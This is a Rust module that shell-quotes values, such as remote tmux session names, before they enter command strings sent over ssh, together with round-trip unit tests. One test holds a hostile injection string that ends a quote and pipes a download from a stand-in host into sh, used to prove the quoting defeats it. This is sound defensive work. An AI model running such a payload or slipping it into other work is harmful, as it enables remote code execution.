//! Handing a value to a shell that is going to evaluate it.
//!
//! Savras builds three commands that end up as *one string* for a shell rather
//! than an argv: the tmux invocation that lays out the column, and the two
//! tmux scripts that `ssh` sends to another machine. Everywhere else a
//! `Command` carries its arguments separately and the shell never sees them,
//! which is why this is a small module and not a habit.
//!
//! The values are not all ours. A remote session's `tmux` field —
//! `session:@window.%pane`, read from `~/.claude/sessions/<pid>.json` on the
//! far side — names a tmux session someone else chose, and it arrives here on
//! its way into a command that box will run. Quoted by hand as `'{session}'`
//! it took a single quote to end the string early and start another command;
//! a tmux session called `it's` broke the same way by accident, which is the
//! honest version of the same bug.
//!
//! One spelling of the answer, so the next command built this way inherits it.

/// A value, safe for a shell to read as exactly one word.
///
/// Words made only of the characters a path, a host or a flag are made of are
/// left alone — the commands Savras prints are meant to be read, and quoting
/// all of them would say nothing and hide what is going on. Everything else is
/// single-quoted, with `'\''` for the quote itself, which is the only escape a
/// POSIX single-quoted string has.
pub fn quote(s: &str) -> String {
    if !s.is_empty()
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_./:=@+".contains(c))
    {
        return s.to_string();
    }
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// An argv, as the one string a shell wants.
pub fn join(parts: &[String]) -> String {
    parts.iter().map(|p| quote(p)).collect::<Vec<_>>().join(" ")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_words_are_left_alone() {
        assert_eq!(quote("/usr/local/bin/svr"), "/usr/local/bin/svr");
        assert_eq!(quote("claude"), "claude");
        assert_eq!(quote("savras-1"), "savras-1");
        assert_eq!(quote("me@box:22"), "me@box:22");
    }

    #[test]
    fn a_space_is_quoted() {
        assert_eq!(quote("/Users/me/My Code/svr"), "'/Users/me/My Code/svr'");
        assert_eq!(quote(""), "''");
    }

    #[test]
    fn a_quote_cannot_end_the_string_early() {
        assert_eq!(quote("it's"), r"'it'\''s'");
        // The injection this module exists for: whatever the payload is, it
        // comes back out as one word rather than as a second command.
        let hostile = "a';curl evil.example|sh;'";
        // The property, not the shape: a shell reading this gets the payload
        // back as one word, with nothing left over to run.
        assert_eq!(unquote(&quote(hostile)), hostile);
    }

    #[test]
    fn joining_quotes_each_word() {
        let parts = ["tmux".to_string(), "a b".to_string()];
        assert_eq!(join(&parts), "tmux 'a b'");
    }

    /// What `sh` does to a single-quoted string, so a test can assert the
    /// round trip rather than a shape.
    fn unquote(s: &str) -> String {
        let mut out = String::new();
        let mut rest = s;
        while !rest.is_empty() {
            if let Some(body) = rest.strip_prefix('\'') {
                let (inside, after) = body.split_once('\'').expect("closed");
                out.push_str(inside);
                rest = after;
            } else if let Some(after) = rest.strip_prefix('\\') {
                let mut chars = after.chars();
                out.extend(chars.next());
                rest = chars.as_str();
            } else {
                let mut chars = rest.chars();
                out.extend(chars.next());
                rest = chars.as_str();
            }
        }
        out
    }
}
